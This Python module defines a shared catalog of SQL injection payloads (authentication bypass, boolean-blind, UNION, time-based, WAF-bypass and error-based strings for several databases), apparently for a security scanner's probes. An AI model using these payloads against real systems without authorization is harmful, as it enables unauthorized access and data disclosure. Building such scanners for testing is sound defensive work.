"""Shared, bounded SQL injection payload catalog.

Transport-specific probes (JSON, query, form, or raw HTTP) import this list
and own only mutation, scope, authentication, and response handling.
"""

from __future__ import annotations


SQL_PAYLOADS: list[dict] = [
    {"class": "sqli_auth_bypass", "value": "' OR 1=1--", "field_hint": "email|user|login|name|account"},
    {"class": "sqli_auth_bypass", "family": "auth_bypass", "value": "' OR '1'='1", "field_hint": "email|user|login|name|account"},
    {"class": "sqli_auth_bypass", "family": "auth_bypass", "value": "' OR '1'='1'--", "field_hint": "email|user|login|name|account"},
    {"class": "sqli_auth_bypass", "family": "auth_bypass", "value": "') OR ('1'='1", "field_hint": "email|user|login|name|account"},
    {"class": "sqli_auth_bypass", "family": "auth_bypass", "value": "admin' --", "field_hint": "email|user|login|name|account"},
    {"class": "sqli_auth_bypass", "family": "auth_bypass", "value": "admin' #", "field_hint": "email|user|login|name|account"},
    {"class": "sqli_auth_bypass", "family": "auth_bypass", "value": "' OR 'x'='x'--", "field_hint": "email|user|login|name|account"},
    {"class": "sqli_error", "value": "'", "field_hint": ".*"},
    {"class": "sqli_error", "family": "error_type", "value": '"', "field_hint": ".*"},
    {"class": "sqli_error", "family": "error_type", "value": "`", "field_hint": ".*"},
    {"class": "sqli_error", "family": "error_type", "value": "')", "field_hint": ".*"},
    {"class": "sqli_error", "family": "error_type", "value": '\"))', "field_hint": ".*"},
    {"class": "sqli_boolean_true", "family": "boolean_blind", "value": "' AND 1=1--", "field_hint": ".*"},
    {"class": "sqli_boolean_false", "family": "boolean_blind", "value": "' AND 1=2--", "field_hint": ".*"},
    {"class": "sqli_boolean_blind", "family": "boolean_blind", "value": "' AND SUBSTRING(database(),1,1)='a'--", "field_hint": ".*"},
    {"class": "sqli_union", "family": "union_readonly", "value": "' UNION SELECT NULL--", "field_hint": ".*"},
    {"class": "sqli_union", "family": "union_readonly", "value": "' UNION SELECT NULL,NULL--", "field_hint": ".*"},
    {"class": "sqli_union", "family": "union_readonly", "value": "' UNION SELECT NULL,NULL,NULL--", "field_hint": ".*"},
    {"class": "sqli_union", "family": "union_readonly", "value": "' UNION SELECT 'a',NULL,NULL--", "field_hint": ".*"},
    {"class": "sqli_time", "value": "1' AND SLEEP(5)-- -", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_time", "family": "time_based", "dbms": "mysql", "value": "' AND SLEEP(5)--", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_time", "family": "time_based", "dbms": "postgresql", "value": "'; SELECT pg_sleep(5)--", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_time", "family": "time_based", "dbms": "mssql", "value": "'; WAITFOR DELAY '0:0:5'--", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_time", "family": "time_based", "dbms": "mysql", "value": "1 AND 1=1 AND SLEEP(5)", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_error_based", "family": "error_based", "value": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "field_hint": ".*"},
    {"class": "sqli_waf_bypass", "family": "waf_bypass", "value": "' /*!UNION*/ /*!SELECT*/ NULL--", "field_hint": ".*"},
    {"class": "sqli_waf_bypass", "family": "waf_bypass", "value": "'UNION%23comment%0ASELECT--", "field_hint": ".*"},
    {"class": "sqli_waf_bypass", "family": "waf_bypass", "value": "' UNION%0ASELECT--", "field_hint": ".*"},
    {"class": "sqli_waf_bypass", "family": "waf_bypass", "value": "' UNION(SELECT 1,NULL,3)--", "field_hint": ".*"},
    {"class": "sqli_numeric", "family": "numeric", "value": ",1", "field_hint": ".*"},
    {"class": "sqli_numeric", "family": "numeric", "value": ",0", "field_hint": ".*"},
    {"class": "sqli_boolean_true", "family": "boolean_pair", "pair_id": "quoted-and", "pair_side": "true", "value": "' Or 1=1 AND '1'='1", "field_hint": ".*"},
    {"class": "sqli_boolean_false", "family": "boolean_pair", "pair_id": "quoted-and", "pair_side": "false", "value": "' Or 1=2 AND '1'='1", "field_hint": ".*"},
    {"class": "sqli_arithmetic", "family": "arithmetic", "pair_id": "concat-div", "pair_side": "true", "value": "'||1/1||'", "field_hint": ".*"},
    {"class": "sqli_arithmetic", "family": "arithmetic", "pair_id": "concat-div", "pair_side": "false", "value": "'||1/0||'", "field_hint": ".*"},
    {"class": "sqli_time", "family": "time_based", "dbms": "mysql", "value": "'%df' and sleep(3)#", "field_hint": ".*", "expect": "time>=2.5", "min_delay": 2.5},
    {"class": "sqli_boolean_true", "family": "boolean_pair", "pair_id": "quoted-and-short", "pair_side": "true", "value": "'and '1'='1", "field_hint": ".*"},
    {"class": "sqli_boolean_false", "family": "boolean_pair", "pair_id": "quoted-and-short", "pair_side": "false", "value": "'and '1'='2", "field_hint": ".*"},
    {"class": "sqli_boolean_true", "family": "boolean_pair", "pair_id": "plus-and", "pair_side": "true", "value": "+AND 1=1", "field_hint": ".*"},
    {"class": "sqli_boolean_false", "family": "boolean_pair", "pair_id": "plus-and", "pair_side": "false", "value": "+AND 1=2", "field_hint": ".*"},
    {"class": "sqli_time", "family": "time_based", "dbms": "mysql", "value": "+AND sleep(5)", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_time", "family": "time_based", "dbms": "mysql", "value": "+AND (SELECT 8778 FROM (SELECT(SLEEP(5)))nXpZ)'", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_error_based", "family": "conditional_error", "dbms": "mysql", "value": "'||1=if(substr(database(),1,1)='1',exp(999),1)||'", "field_hint": ".*"},
    {"class": "sqli_time", "family": "time_based", "dbms": "mysql", "value": "'and(select*from(select sleep(5))a/**/union/**/select 1)='", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_time", "family": "time_based", "dbms": "mysql", "value": "')and(select*from(select sleep(5))a/**/union/**/select 1)--", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_time", "family": "time_based", "dbms": "mysql", "value": "1');SELECT SLEEP(5)#", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_time", "family": "time_based", "dbms": "mysql", "value": "(SELECT 6242 FROM (SELECT(SLEEP(5)))MgdE)", "field_hint": ".*", "expect": "time>=4"},
    {"class": "sqli_error_based", "family": "conditional_error", "dbms": "mysql", "value": "(select*from(select if(substr(database(),1,1)='j',exp(709),exp(710)))a)", "field_hint": ".*"},
]
